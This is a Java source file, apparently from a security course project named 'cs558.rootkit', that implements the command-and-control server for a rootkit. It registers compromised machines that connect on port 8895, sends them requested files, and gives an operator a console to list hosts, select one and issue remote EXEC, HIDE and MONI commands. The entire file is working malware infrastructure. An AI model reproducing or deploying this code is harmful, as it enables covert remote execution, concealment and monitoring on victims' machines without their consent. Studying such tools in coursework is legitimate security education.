package cs558.rootkit;

import java.io.*;
import java.net.*;
import java.util.*;

public class Server {
	Integer port = 8895;
	Hashtable<String, ServiceThread> machines;
	CommandThread ct;
	ServerSocket ss;
	Integer buffersize = 4096;
	ServiceThread lastSocket;
	boolean runable;
	
	public static void main(String[] args) {
		Server s = new Server();
		try {
			s.start();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	@SuppressWarnings("resource")
	public void start() throws IOException {
		//Start a command thread
		ct = new CommandThread(this);
		ct.start();
		
		// open a socket server with a new thread;
		ss = new ServerSocket(port);
		machines = new Hashtable<String, ServiceThread>();
		runable = true;
		while (this.runable) {
			try {
				Socket s = ss.accept();
				lastSocket = new ServiceThread(s, this);
				lastSocket.run();
			} catch (SocketException e) {
				if(this.runable){
					throw e;
				}
			}
		}
	}
	
	public void doRegister(ServiceThread st) {
		System.out.println("A new machine:" + st.socket.getInetAddress().getHostAddress());
		System.out.print("$ ");
		this.machines.put(st.socket.getInetAddress().getHostAddress(), st);
		st.output.print("ACK");
		st.output.flush();
	}
	
	public void doObtain(ServiceThread st){
		try {
			String filepath = st.input.readLine();
			System.out.println("A obtain request for "+ filepath + ".\n$ ");
			String OS = st.input.readLine();
			DataOutputStream output = st.dataoutput;
			File f = new File(filepath);
			if(!f.exists()){
				output.writeInt(0);
				output.flush();
			} else {
				for(byte b : intToBytes((int)f.length())){
					output.writeByte(b);
				}
				output.flush();
				DataInputStream dis = new DataInputStream(new BufferedInputStream(new FileInputStream(filepath)));
				
				byte[] buf = new byte[buffersize];
				while (true) {
					int read = 0;
					if (dis != null) {
						read = dis.read(buf);
					}

					if (read == -1) {
						break;
					}
					output.write(buf, 0, read);
				}
				
				output.flush();
				dis.close();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public byte[] intToBytes(int value)   
	{   
	    byte[] src = new byte[4];  
	    src[0] = (byte) ((value>>24) & 0xFF);  
	    src[1] = (byte) ((value>>16)& 0xFF);  
	    src[2] = (byte) ((value>>8)&0xFF);    
	    src[3] = (byte) (value & 0xFF);       
	    return src;  
	}  
	
	public void doList(){
		Enumeration<String> k = machines.keys();
		while(k.hasMoreElements()){ 
			System.out.println(k.nextElement());
		}
	}
	
	public void doSendClient(ServiceThread st, String cmd){
		byte[] buf = new byte[buffersize];
		int i=0;
		
		if(st == null){
			st = lastSocket;
		}
		
		try {
			st.output.println(cmd);
			st.output.flush();
			Byte b;
			
			b = st.datainput.readByte();
			if(b.intValue() == 48) return;
			
			for(i=0; i < buffersize; i++){
                b = st.datainput.readByte();
                if(b.intValue() == -1 || b.intValue() == 0){
                	break;
                }
                buf[i] = b;
                if(b.intValue() == 0){
                	break;
                }
                
            }
			System.out.println(new String(buf));
		} catch (EOFException e){		//This means no result, so do not need print as error.
		} catch (IOException e) {
			e.printStackTrace();
		} 
	}
	
	public void doQuit(){
		this.runable = false;
		try {
			Enumeration<String> k = machines.keys();
			while(k.hasMoreElements()){ 
				machines.get(k.nextElement()).close();
			}
			this.ss.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public void doConnect(String ip){
		ServiceThread st = this.machines.get(ip);
		if(st != null){
			System.out.println("Connect success!");
			ct.current = st;
		}
	}

	class ServiceThread extends Thread {
		Socket socket;
		BufferedReader input;
		DataInputStream datainput;
		DataOutputStream dataoutput;
		PrintWriter output;
		String filepath;
		Server serv;
		

		public ServiceThread(Socket s, Server serv) throws IOException {
			this.socket = s;
			this.serv = serv;
			input = new BufferedReader(new InputStreamReader(s.getInputStream(), "utf-8"));
			output = new PrintWriter(new OutputStreamWriter(s.getOutputStream()), true);
			datainput = new DataInputStream(new BufferedInputStream(s.getInputStream()));
			dataoutput = new DataOutputStream(s.getOutputStream());
		}
		
		public void close(){
			try {
				this.input.close();
				this.datainput.close();
				this.dataoutput.close();
				this.output.close();
				this.socket.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		public void run() {
			try {
				String req = input.readLine();
				if("obtain".equals(req)){
					
					doObtain(this);
				} else if("register".equals(req)){
					doRegister(this);
				} 
			} catch (IOException e) {
				e.printStackTrace();
			} 
		}
	}
	
	class CommandThread extends Thread{
		Server serv;
		Scanner sc;
		ServiceThread current;
		
		public CommandThread(Server serv){
			this.serv = serv;
			this.sc = new Scanner(System.in);
		}
		
		public void run() {
			while(true){
				try {
					System.out.print("$ ");
					String cmd = sc.nextLine().trim();
					String s = cmd.substring(0, 4).toUpperCase();
					ArrayList<String> args = new ArrayList<String>();
					if("EXIT".equals(s)){
						doQuit();
						break;
					} else if("CONN".equals(s)  && splitcmd(cmd, args, 2)){
						doConnect(args.get(1));
					} else if("EXEC".equals(s) || "HIDE".equals(s) || "MONI".equals(s)){
						doSendClient(current, cmd);
					} else if("LIST".equals(s)){
						doList();
					} else {
						System.out.print("Incorrect command or incorrect args.\n");
					}
				}  catch (StringIndexOutOfBoundsException e) {
					continue;
				}  catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
		
		private boolean splitcmd(String cmd, ArrayList<String> args, int argv){
			String[] str = cmd.split(" ");
			
			for(String s : str){
				if(!"".equals(s.trim())){
					args.add(s.trim());
				}
			}

			return args.size() == argv ? true : false;
		}
	}
}
